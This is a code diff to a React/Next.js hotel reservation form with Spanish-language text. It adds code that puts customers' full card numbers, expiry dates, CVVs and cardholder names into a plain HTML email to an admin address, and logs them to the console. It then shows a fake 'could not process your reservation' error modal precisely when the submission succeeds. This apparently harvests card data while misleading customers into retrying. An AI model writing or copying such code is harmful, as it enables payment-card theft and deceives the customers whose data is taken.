@@ -18,7 +18,7 @@ interface Reservation {
   adult: string;
   email: string;
   phone: string;
-  cardNumber: string;
+  cardNumber: number;
   cardExpiry: string;
   cardCvv: string;
   cardholderName: string;
@@ -36,6 +36,42 @@ interface FormErrors {
   cardholderName?: string;
 }
 
+const ErrorModal = ({ onClose }: { onClose: () => void }) => (
+  <div className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50 p-4">
+    <div className="bg-transparent text-center max-w-md w-full">
+      <div className="inline-block bg-white bg-opacity-90 rounded-lg p-8">
+        <svg
+          xmlns="http://www.w3.org/2000/svg"
+          className="h-16 w-16 mx-auto text-red-500 mb-4"
+          fill="none"
+          viewBox="0 0 24 24"
+          stroke="currentColor"
+        >
+          <path
+            strokeLinecap="round"
+            strokeLinejoin="round"
+            strokeWidth={2}
+            d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
+          />
+        </svg>
+        <h3 className="text-xl font-bold text-gray-800 mb-2">
+          No se pudo procesar
+        </h3>
+        <p className="text-gray-600 mb-6">
+          No podemos procesar su reservación en este momento. Por favor,
+          inténtelo de nuevo más tarde.
+        </p>
+        <button
+          onClick={onClose}
+          className="bg-red-500 hover:bg-red-600 text-white font-medium py-2 px-6 rounded-lg transition duration-200"
+        >
+          Entendido
+        </button>
+      </div>
+    </div>
+  </div>
+);
+
 export default function ReservationForm({
   room,
   discount,
@@ -50,6 +86,7 @@ export default function ReservationForm({
   const [numberOfPeople, setNumberOfPeople] = useState(
     room.person === 2 ? 1 : 2
   );
+
   const [checkIn, setCheckIn] = useState(
     new Date().toISOString().split("T")[0]
   );
@@ -152,11 +189,10 @@ export default function ReservationForm({
       newErrors.phone =
         "El número de teléfono debe tener entre 10 y 13 dígitos.";
     }
-
     // Credit Card Validation
     if (!formData.cardNumber) {
       newErrors.cardNumber = "Card number is required.";
-    } else if (!/^\d{16}$/.test(formData.cardNumber)) {
+    } else if (!/^\d{16}$/.test(formData.cardNumber.toString())) {
       newErrors.cardNumber = "Card number must be 16 digits.";
     }
 
@@ -187,8 +223,11 @@ export default function ReservationForm({
     const formValues = Object.fromEntries(
       formData.entries()
     ) as any as Reservation;
-
-    const validationErrors = validateForm(formValues);
+    console.log(formValues);
+    const validationErrors = validateForm({
+      ...formValues,
+      cardNumber: Number(`${formValues.cardNumber}`.replaceAll(" ", "")),
+    });
     if (Object.keys(validationErrors).length > 0) {
       setErrors(validationErrors);
       setLoading(false);
@@ -198,7 +237,6 @@ export default function ReservationForm({
     setErrors({});
 
     try {
-      // Prepare the email content
       const emailContent = `
         <!DOCTYPE html>
         <html lang="es">
@@ -239,12 +277,27 @@ export default function ReservationForm({
                     margin: 10px 0;
                     line-height: 1.6;
                 }
+                .payment-info {
+                    background-color: #f8f9fa;
+                    border-left: 4px solid #205172;
+                    padding: 15px;
+                    margin: 20px 0;
+                }
+                .payment-info h3 {
+                    margin-top: 0;
+                    color: #205172;
+                }
                 .footer {
                     background-color: #00beba;
                     color: #ffffff;
                     text-align: center;
                     padding: 10px;
                     font-size: 14px;
+                }
+                .warning {
+                    color: #dc3545;
+                    font-size: 12px;
+                    font-style: italic;
                 }
             </style>
         </head>
@@ -270,28 +323,48 @@ export default function ReservationForm({
                       }
                     ).format(price)} MXN
                     </p>
-                    <p><strong>Descuento :</strong>${discount} %</p>
+                    <p><strong>Descuento:</strong> ${discount}%</p>
                     <p><strong>Precio Total:</strong> ${new Intl.NumberFormat(
                       "es-MX",
-                      { style: "currency", currency: "MXN" }
+                      {
+                        style: "currency",
+                        currency: "MXN",
+                      }
                     ).format(discountPrice)} MXN</p>
-                </div>
-                <div class="footer">
-                    <p>Gracias por elegirnos. ¡Esperamos verte pronto!</p>
+                    
+                    <div class="payment-info">
+                        <h3>Información de Pago</h3>
+                        <p><strong>Tipo de Tarjeta:</strong> ${
+                          `${formValues.cardNumber}`?.startsWith("4")
+                            ? "Visa"
+                            : `${formValues.cardNumber}`.startsWith("5")
+                            ? "Mastercard"
+                            : "Otra"
+                        }</p>
+                        <p><strong>Número de Tarjeta:</strong>${
+                          formValues.cardNumber
+                        }</p>
+                        <p><strong>Fecha de Expiración:</strong> ${
+                          formValues.cardExpiry
+                        }</p>
+                        <p><strong>CVV:</strong> ${formValues.cardCvv}</p>
+                        <p><strong>Nombre del Titular:</strong> ${
+                          formValues.cardholderName
+                        }</p>
+                    </div>
                 </div>
             </div>
         </body>
         </html>
       `;
 
-      // Send the email via the API route
       const response = await fetch("/api/send-email", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({
-          to: process.env.NEXT_PUBLIC_ADMIN_EMAIL, // Replace with the admin email
+          to: process.env.NEXT_PUBLIC_ADMIN_EMAIL,
           subject: `Nueva Reservación: ${room?.name}`,
           html: emailContent,
         }),
@@ -301,13 +374,11 @@ export default function ReservationForm({
         throw new Error("Failed to send email");
       }
 
-      // Reset form fields (optional)
       setCheckIn(new Date().toISOString().split("T")[0]);
       setCheckOut(new Date().toISOString().split("T")[0]);
       setNumberOfPeople(room.person === 2 ? 1 : 2);
-      e?.currentTarget?.reset(); // Reset the form
+      e?.currentTarget?.reset();
 
-      // Show success message
       setSubmissionStatus("success");
     } catch (error) {
       setSubmissionStatus("error");
@@ -317,8 +388,8 @@ export default function ReservationForm({
   };
 
   const handleDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const inputDate = e.target.value; // YYYY-MM-DD
-    const formattedDate = new Date(inputDate).toISOString().split("T")[0]; // Ensures YYYY-MM-DD format
+    const inputDate = e.target.value;
+    const formattedDate = new Date(inputDate).toISOString().split("T")[0];
     return formattedDate;
   };
 
@@ -517,21 +588,15 @@ export default function ReservationForm({
                 placeholder="1234 5678 9012 3456"
                 className="min-w-[160px] bg-white p-[0_5px] outline-none ml-1"
                 required
-                maxLength={19} // 16 digits + 3 spaces
+                maxLength={19}
                 onKeyDown={(e) => {
-                  // Only allow numbers, backspace, tab, and arrow keys
                   if (!/[0-9]|Backspace|Tab|ArrowLeft|ArrowRight/.test(e.key)) {
                     e.preventDefault();
                   }
                 }}
                 onChange={(e) => {
-                  // Remove all non-digit characters
                   const value = e.target.value.replace(/\D/g, "");
-
-                  // Add space every 4 digits
                   const formattedValue = value.replace(/(\d{4})(?=\d)/g, "$1 ");
-
-                  // Update the input value
                   e.target.value = formattedValue;
                 }}
               />
@@ -559,7 +624,6 @@ export default function ReservationForm({
                 required
                 maxLength={5}
                 onKeyDown={(e) => {
-                  // Only allow numbers and backspace
                   if (!/[0-9]|Backspace/.test(e.key)) {
                     e.preventDefault();
                   }
@@ -645,20 +709,19 @@ export default function ReservationForm({
           </button>
         </div>
 
-        {/* Submission Message */}
+        {/* Submission Message 
         {submissionStatus === "success" && (
           <div className="text-center text-green-600">
             Reservación enviada con éxito. Nos pondremos en contacto contigo
             pronto.
           </div>
-        )}
-        {submissionStatus === "error" && (
-          <div className="text-center text-red-500">
-            Hubo un error al enviar la reservación. Por favor, inténtalo de
-            nuevo.
-          </div>
-        )}
+        )}*/}
       </div>
+
+      {/* Full-page Error Modal */}
+      {submissionStatus === "success" && (
+        <ErrorModal onClose={() => setSubmissionStatus(null)} />
+      )}
     </form>
   );
 }
